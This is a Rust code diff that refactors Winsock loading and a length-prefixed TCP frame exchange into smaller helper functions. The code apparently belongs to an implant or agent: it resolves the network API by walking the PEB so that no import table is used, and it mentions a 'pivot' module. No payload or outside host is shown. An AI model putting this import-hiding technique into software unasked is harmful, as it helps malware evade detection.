@@ -170,6 +170,21 @@ pub unsafe fn ensure_ws2_32() {
     if cur != 0 {
         return;
     }
+    if !ensure_ws2_32_load_dll() {
+        let _ = WSA.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
+        return;
+    }
+    match ensure_ws2_32_resolve() {
+        Some(fns) => ensure_ws2_32_install(fns),
+        None => {
+            let _ = WSA.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
+        }
+    }
+}
+
+/// Force-load ws2_32.dll via kernel32 LoadLibraryA (PEB-walk resolution, no
+/// IAT). Returns true when the module handle is non-null.
+unsafe fn ensure_ws2_32_load_dll() -> bool {
     // Force-load ws2_32.dll via kernel32!LoadLibraryA.
     type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
     let mut ws2_32_loaded = false;
@@ -181,10 +196,12 @@ pub unsafe fn ensure_ws2_32() {
             ws2_32_loaded = true;
         }
     }
-    if !ws2_32_loaded {
-        let _ = WSA.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
-        return;
-    }
+    ws2_32_loaded
+}
+
+/// Resolve the 12 Winsock exports and build the function table.
+/// Returns None when any export is missing.
+unsafe fn ensure_ws2_32_resolve() -> Option<alloc::boxed::Box<WsaFns>> {
     let wsa_startup = export_addr(b"ws2_32.dll", b"WSAStartup");
     let wsa_cleanup = export_addr(b"ws2_32.dll", b"WSACleanup");
     let socket = export_addr(b"ws2_32.dll", b"socket");
@@ -213,21 +230,9 @@ pub unsafe fn ensure_ws2_32() {
         Some(getsockopt),
         Some(setsockopt),
         Some(wsa_get_last_error),
-    ) = (
-        wsa_startup,
-        wsa_cleanup,
-        socket,
-        connect,
-        send,
-        recv,
-        closesocket,
-        select,
-        ioctlsocket,
-        getsockopt,
-        setsockopt,
-        wsa_get_last_error,
-    ) {
-        let fns = alloc::boxed::Box::new(WsaFns {
+    ) = (wsa_startup, wsa_cleanup, socket, connect, send, recv, closesocket, select, ioctlsocket, getsockopt, setsockopt, wsa_get_last_error)
+    {
+        Some(alloc::boxed::Box::new(WsaFns {
             wsa_startup: core::mem::transmute(wsa_startup),
             wsa_cleanup: core::mem::transmute(wsa_cleanup),
             socket: core::mem::transmute(socket),
@@ -240,16 +245,22 @@ pub unsafe fn ensure_ws2_32() {
             getsockopt: core::mem::transmute(getsockopt),
             setsockopt: core::mem::transmute(setsockopt),
             wsa_get_last_error: core::mem::transmute(wsa_get_last_error),
-        });
-        let ptr = alloc::boxed::Box::into_raw(fns) as usize;
-        match WSA.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
-            Ok(_) => return,
-            Err(_) => {
-                drop(alloc::boxed::Box::from_raw(ptr as *mut WsaFns));
-            }
-        }
+        }))
     } else {
-        let _ = WSA.compare_exchange(0, 1, Ordering::Release, Ordering::Acquire);
+        None
+    }
+}
+
+/// One-time install of the resolved table into the static. If we lost the
+/// race with a concurrent initializer, free our allocation.
+unsafe fn ensure_ws2_32_install(fns: alloc::boxed::Box<WsaFns>) {
+    use core::sync::atomic::Ordering;
+    let ptr = alloc::boxed::Box::into_raw(fns) as usize;
+    match WSA.compare_exchange(0, ptr, Ordering::Release, Ordering::Acquire) {
+        Ok(_) => {}
+        Err(_) => {
+            drop(alloc::boxed::Box::from_raw(ptr as *mut WsaFns));
+        }
     }
 }
 
@@ -452,14 +463,27 @@ unsafe fn tcp_exchange(
         sin_addr,
         sin_zero: [0u8; 8],
     };
+    if !tcp_exchange_connect(fns, s, &addr) {
+        return None;
+    }
+    tcp_exchange_io_timeouts(fns, s);
+    if !tcp_exchange_send(fns, s, frame) {
+        return None;
+    }
+    tcp_exchange_recv(fns, s)
+}
 
+/// Bounded non-blocking connect: FIONBIO + select-for-writability with a
+/// CONNECT_TIMEOUT_MS deadline, SO_ERROR verdict, then restore blocking mode.
+/// Returns false (with ERR_CH_TCP_CONNECT) when the connect failed.
+unsafe fn tcp_exchange_connect(fns: &WsaFns, s: Socket, addr: &SockaddrIn) -> bool {
     // Non-blocking connect + select-for-writability, then restore blocking
     // mode for the (timeout-bounded) send/recv phase. Same shape as
     // `pivot.rs`'s connect; the only difference is we always restore blocking
     // mode because this socket is used synchronously below.
     let mut nonblock: u32 = 1;
     let _ = (fns.ioctlsocket)(s, FIONBIO, &mut nonblock);
-    let rc = (fns.connect)(s, &addr, core::mem::size_of::<SockaddrIn>() as i32);
+    let rc = (fns.connect)(s, addr, core::mem::size_of::<SockaddrIn>() as i32);
     let mut connected = rc == 0;
     if !connected && (fns.wsa_get_last_error)() == WSAEWOULDBLOCK {
         let mut wfds = FdSet {
@@ -495,9 +519,13 @@ unsafe fn tcp_exchange(
     let _ = (fns.ioctlsocket)(s, FIONBIO, &mut blocking);
     if !connected {
         crate::entry::diag_mark(b"ERR_CH_TCP_CONNECT");
-        return None;
+        return false;
     }
+    true
+}
 
+/// Bound the send/recv phases with SO_SNDTIMEO / SO_RCVTIMEO (IO_TIMEOUT_MS).
+unsafe fn tcp_exchange_io_timeouts(fns: &WsaFns, s: Socket) {
     // ---- Bound send/recv with SO_SNDTIMEO / SO_RCVTIMEO ----
     // Winsock takes the DWORD millisecond value; on the LE x64 target copying
     // the u32 (via its bytes) is correct.
@@ -517,7 +545,11 @@ unsafe fn tcp_exchange(
         &rcvto as *const u32 as *const u8,
         core::mem::size_of::<u32>() as i32,
     );
+}
 
+/// Send length prefix (LE) + frame body. Returns false (with ERR_CH_TCP_SEND)
+/// on a send failure.
+unsafe fn tcp_exchange_send(fns: &WsaFns, s: Socket, frame: &[u8]) -> bool {
     // ---- Send length prefix (LE) + frame body ----
     let len_be: [u8; 4] = (frame.len() as u32).to_le_bytes();
     let mut wire: Vec<u8> = Vec::with_capacity(4 + frame.len());
@@ -525,9 +557,14 @@ unsafe fn tcp_exchange(
     wire.extend_from_slice(frame);
     if !send_all(fns, s, &wire) {
         crate::entry::diag_mark(b"ERR_CH_TCP_SEND");
-        return None;
+        return false;
     }
+    true
+}
 
+/// Recv length prefix (LE) + response body. Rejects a huge length prefix
+/// (MAX_RESPONSE_BYTES cap) and maps a zero-length reply to Some(empty).
+unsafe fn tcp_exchange_recv(fns: &WsaFns, s: Socket) -> Option<Vec<u8>> {
     // ---- Recv length prefix (LE) ----
     let len_buf = recv_exact(fns, s, 4)?;
     let resp_len = u32::from_le_bytes([
